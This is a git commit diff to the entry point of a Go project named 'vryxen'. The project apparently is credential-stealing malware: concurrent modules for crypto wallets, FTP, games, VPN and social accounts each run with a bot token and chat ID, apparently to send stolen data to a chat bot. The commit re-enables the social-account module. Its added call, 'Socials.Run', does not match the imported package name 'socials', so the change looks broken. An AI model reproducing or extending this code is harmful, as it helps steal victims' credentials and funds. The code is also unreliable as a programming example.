525f66838170802f27db827390dab93ff713d704
Xretic <95174481+unf6@users.noreply.github.com>
2025-05-15 18:18:38 +0000

    Update main.go

--- cmd/main.go
+++ cmd/main.go
@@ -15,7 +15,7 @@ import (
 
 
 	
-	//"github.com/unf6/vryxen/internal/core/socials"
+	"github.com/unf6/vryxen/internal/core/socials"
 	"github.com/unf6/vryxen/internal/core/cryptowallets"
 	"github.com/unf6/vryxen/internal/core/ftps"
 	"github.com/unf6/vryxen/internal/core/games"
@@ -75,9 +75,9 @@ func main() {
 		games.Run,
 		ftps.Run,
 		vpn.Run,
+		Socials.Run,
 	}
 
-	//Socials.Run()
 	for _, action := range actions {
 		go action(CONFIG["botToken"].(string), CONFIG["chatId"].(string))
 	}
